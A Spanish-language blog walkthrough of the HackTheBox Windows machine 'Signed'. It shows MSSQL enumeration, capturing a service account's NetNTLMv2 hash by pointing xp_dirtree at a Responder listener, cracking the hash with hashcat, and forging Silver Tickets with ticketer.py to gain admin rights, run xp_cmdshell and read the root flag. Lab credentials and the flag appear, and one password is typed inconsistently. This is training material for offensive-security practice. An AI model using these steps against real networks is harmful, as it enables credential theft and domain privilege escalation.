---
layout: single
title: "Machines - Signed (HTB)"
author_profile: true
published: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades practicando todo el proceso de _pentesting_ como la _obtención de información_, _explotación_ para obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/signed/logo.png" | relative_url }})

## Resumen Signed

Esta máquina __Windows__ es sencilla hasta cierto punto pues el foothold y la escalada es prácticamente el mismo método de explotación (utilizando Silver Tickets) veamos los detalles:

1. __Enumeración__ - Esto para analizar el host, donde sólo estará un sólo servicio disponible.
2. __Primer Usuario: Capturando Hash del servicio__ - Enumeraremos MSSQL y obtendremos un hash del servicio `mssql` usando `responder`.
3. __Segundo Usuario: Buscando vías potenciales de elevación__ - Con el nuevo usuario, enumeraremos otra vez para buscar posibles vias de escalada.
4. __Escalada con Silver Ticket__ - Encontrando un grupo interesante, utilizaremos un `Silver Ticket Attack` aprovechando nuestra cuenta de servicio.
5. __Obteniendo acceso con el Silver Ticket__ - Obtenemos acceso como administrador de forma interna en `mssql` lo que nos permitirá leer ambas flags.

## Laboratorio

### Enumeración

Como siempre y como el proceso manda, enumeramos todos los puertos del objetivo a una velocidad no menor a 5000 paquetes por segundo, deshabilitando la resolución DNS y Sin el escaneo ping que hace para ver si está activo o no, filtrando por :

```js
❯ nmap -p- --min-rate 5000 10.10.11.90 -Pn -n -oG Allports --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 00:00 CST
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 37.91% done; ETC: 00:02 (0:01:15 remaining)
Nmap scan report for 10.10.11.90
Host is up (0.19s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 70.90 seconds
```

Para descartar más servicios, enumeramos el top 100 puertos `UDP`

```js
❯ sudo nmap --top-ports 100 -sU 10.10.11.90 -Pn -n
[sudo] password for n1c37ry05: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 00:03 CST
Nmap scan report for 10.10.11.90
Host is up (0.38s latency).
Not shown: 99 open|filtered udp ports (no-response)
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 30.22 seconds
```

Sabiendo esto, parece que deberemos de trabajar sólo con `mssql`, así que lo enumeramos en busca de su versión

```js
sudo nmap -p1433 -sCV -Pn -n 10.10.11.90
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 00:11 CST
Nmap scan report for 10.10.11.90
Host is up (0.25s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-10-18T06:11:49+00:00; -1s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-18T00:59:40
|_Not valid after:  2055-10-18T00:59:40
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.21 seconds
```

### Primer Usuario: Capturando Hash del servicio

Directamente de la versión, no hay algo que podamos explotar tranquilamente, así que, haciendo caso a la descripción, accedemos a `mssql` con las credenciales __scott / Sm230#C5NatH__ y enumeramos lo básico: Bases de datos disponibles

```js
impacket-mssqlclient.py 'scott:Sm230#C5NatH'@10.10.11.90
[<SNIP!>
SQL (scott  guest@master)> select name from master.dbo.sysdatabases
name
------   
master   

tempdb   

model    

msdb     
```

Sólo las por defecto, ahora probamos si podemos de pura casualidad, ejecutar comandos:

```js
SQL (scott  guest@master)> xp_cmdshell ''whoami''
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

También negado, ahora, enumeramos si podemos hacer impersonate a algún usuario:

```js
SQL (scott  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name   
----    
```

Tampoco nos devuelve algo, podemos probar `linked servers`

```js
SQL (scott  guest@master)> SELECT srvname, isremote FROM sysservers
srvname   isremote   
-------   --------   
DC01             1
```

Nada a lo que podamos movernos. Algo que podemos hacer, es robar el _hash_ del servicio `mssql` y con algo de fé, poder desencriptar su `NTLMv2` y poder acceder al servicio con esa cuenta:

Para este objetivo, devemos primero montar con `responder` un servicio para poder capturar el hash de la solicitud desde nuestra máquina de atacante:

```js
❯ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Current Session Variables:
    Responder Machine Name     [WIN-R7M8OCPRO3O]
    Responder Domain Name      [0K2S.LOCAL]
    Responder DCE-RPC Port     [48186]

[+] Listening for events...
 
```

Una vez montado, sólo debemos hacer una `request` desde `mssql` o bien, utilizando `xp_dirtree` o `xp_subdirs`:

```js
SQL (scott  guest@master)> EXEC master..xp_dirtree '\\10.10.16.6\shared\inexist'
subdirectory   depth   
------------   -----   
```

Y pronto recibimos el `hash` en el `responder` a consecuencia del proceso de autenticación:

```js
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:0a34dbee99ce2e15:034AC7349C2D262<SNIP!>00000000
```

El siguiente paso, es tratar de crackearlo con `hashcat` en su módulo 5600 correspondiente a `NetNTLMv2`:

```js
❯ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
<SNIP!>
MSSQLSVC::SIGNED:<SNIP!>:purPLE9785!@
<SNIP!>
```

### Segundo Usuario: Buscando vías potenciales de elevación

Ahora, podemos acceder a `mssql` usando la cuenta de servicio:

```js
❯ impacket-mssqlclient.py 'SIGNED.HTB/MSSQLSVC:purPLE9785!@'@10.10.11.90 -windows-auth
Impacket v0.13.0.dev0+20250605.14806.5f78065 - Copyright Fortra, LLC and its affiliated companies 
<SNIP!>
SQL (SIGNED\mssqlsvc  guest@master)> 
```

Ahora, aprovechando la cuenta de servicio, podemos potencialmente, enumerar más cosas, entre ellas, enumerar los usuarios/grupos con derechos de `sysadmin`:

```js
SQL (SIGNED\mssqlsvc  guest@master)> SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id=rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id WHERE r.name='sysadmin';
role       member                      
--------   -------------------------   
sysadmin   sa                          

sysadmin   SIGNED\IT                   

sysadmin   NT SERVICE\SQLWriter        

sysadmin   NT SERVICE\Winmgmt          

sysadmin   NT SERVICE\MSSQLSERVER      

sysadmin   NT SERVICE\SQLSERVERAGENT
```

Lo que nos puede saltar a la vista, es el grupo `IT`, que no es un grupo por defecto y, teniendo en cuenta que tenemos la cuenta de servicio a nuestra disposición, podemos tener un ataque potencial: `Silver Ticket` es un ataque donde nosotros mismos creamos un ticket de servicio para acceder como cualquier usuario ante el servicio, esto, es aprovechando que tenemos acceso suficiente como para firmar nosotros mismos el TGS (pues contamos con la contraseña del servicio emisor).

### Escalada con Silver Ticket

Para esto, necesitamos varias cosas:

* El `NTHash` de la contraseña del servicio
* El SID del dominio
* El nombre del dominio
* El `spn` objetivo
* El ID del grupo a meternos  

Qué detalles nos faltan?, el `SID` y el `NTHash`; para el SID, podemos obtenerlo desde `mssql` haciendo la query a `master.sys.syslogins`:

```js
SELECT sid,name FROM master.sys.syslogins
 sid   name                                      
-------------------------------------------------------------------   ---------------------------------------   
b'01'   sa

<SNIP!>

b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   SIGNED\IT

<SNIP!>
```

Esto, está codificado en hexadecimal, por lo que hacemos un pequeó one liner de python para leerla:

```js
❯ python3 -c "import binascii; sid=binascii.unhexlify('<ArrayBinario>'); print('SID-{}-{}-{}'.format(sid[0], int.from_bytes(sid[2:8],'big'), '-'.join(str(int.from_bytes(sid[8+i*4:12+i*4],'little')) for i in range(sid[1]))))"
SID-1-5-21-4088429403-1159899800-2753317549-1105
```

Este script, está pasando la cadena en binario a un formato legible, separando el SID del dominio del ID del grupo al que pertenece (el `1105` que corresponde a `SIGNED\IT`). Y ahora, sólo necesitamos pasar la contraseña del servicio a `MD4` utilizando `openssl`

```js
❯ echo -n "purPLE9795\!@" | iconv -f UTF-8 -t UTF-16LE | openssl md4
MD4(stdin)= ef699375c3285c54128a3ee1ddb1a0cc
```

Y finalmente, tiramos de `ticketer` para crear nuestro `Silver Ticket` para meternos a notros mismos a el grupo `SIGNED\IT` (1105)

```js
❯ ticketer.py -nthash ef699375c3285c54128a3ee1ddb1a0cc -domain-sid SID-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSVC/DC01.SIGNED.HTB
:1433 -groups 1105 mssqlsvc
<SNIP!>
```

### Obteniendo acceso con el Silver Ticket

Con este ticket, estamos haciendo creer al servicio que el usuario `mssqlsvc` es parte de `SIGNED\IT` así que exportamos el ticket para utilizarlo con kerberos:

```js
❯ export KRB5CCNAME=$PWD/mssqlsvc.ccache
```

Y accedemos con él:

```js
❯ took  7s impacket-mssqlclient.py 'SIGNED.HTB/mssqlsvc'@DC01.SIGNED.HTB -k -no-pass
Impacket v0.13.0.dev0+20250605.14806.5f78065 - Copyright Fortra, LLC and its affiliated companies 
<SNIP!>
SQL (SIGNED\Administrator  dbo@master)>
```

Esto confirma que ya tenemos mayores privilegios! (lo que nos habilita el `xp_cmdshell`).

```
SQL (SIGNED\Administrator  dbo@master)> execute('xp_cmdshell ''whoami''')
output
---------------
signed\mssqlsvc

NULL
```

Ahora, el pertenecer a un grupo privilegiado no significa que tengamos mayor acceso al sistema; __sólo representa un foothold__ pues el tirar de `xp_cmdshell` creará una shell pero con los privilegios con los que se ejecuta `mssql` (Puedes considerarlo privilegio mínimo), pero no todo está exactamente perdido.

Podemos abusar del Silver Ticket para añadirnos a nosotros mismos a `Domain Admins` Pero primero necesitamos obtener el SID de nuestro usuario utilizando `Get-ADUser`:

```js
SQL (SIGNED\Administrator  dbo@master)> execute('xp_cmdshell ''powershell.exe -c Get-ADUser -Filter *''')
output                                                                                                                                                                                                        
------------------------------------------------------------------  
<SNIP!>
DistinguishedName : CN=mssqlsvc,CN=Users,DC=SIGNED,DC=HTB
Enabled           : True
GivenName         : mssqlsvc
Name              : mssqlsvc
ObjectClass       : user
ObjectGUID        : 5cc7777b-bf7b-4cfd-b9ae-43fba5a28c2c
SamAccountName    : mssqlsvc
SID               : S-1-5-21-4088429403-1159899800-2753317549-1103
Surname           :
UserPrincipalName : mssqlsvc@SIGNED.HTB
```

Y volvemos a crear el Ticket especificando el `User ID` y el SID del grupo `Domain Admins`:

```js
ticketer.py -nthash ef699375c3285c54128a3ee1ddb1a0cc -domain-sid SID-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSVC/DC01.SIGNED.HTB
:1433 -groups 512,1105 -user-id 1103 mssqlsvc
```

Y probamos accediendo de la misma manera, intentando leer un archivo:

```js
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
BulkColumn
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
b"# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\r\n#\r\n# This file contains the mappings of IP addresses to host names. Each\r\n# entry should be kept on an individual line. The IP address should\r\n# be placed in the first column followed by the corresponding host name.\r\n# The IP address and the host name should be separated by at least one\r\n# space.\r\n#\r\n# Additionally, comments (such as these) may be inserted on individual\r\n# lines or following the machine name denoted by a '#' symbol.\r\n#\r\n# For example:\r\n#\r\n#      102.54.94.97     rhino.acme.com          # source server\r\n#       38.25.63.10     x.acme.com              # x client host\r\n\r\n# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n"   
```

No parecerá a primera instancia, pero, esto indica que tenemos lectura arbitraría de archivos, podemos probarlo si leemos algo del administrador, como por ejemplo... La flag:


```js
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
BulkColumn
---------------------------------------
b'b80e121b8840af1a28d35a05c587def1\r\n'
```

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.

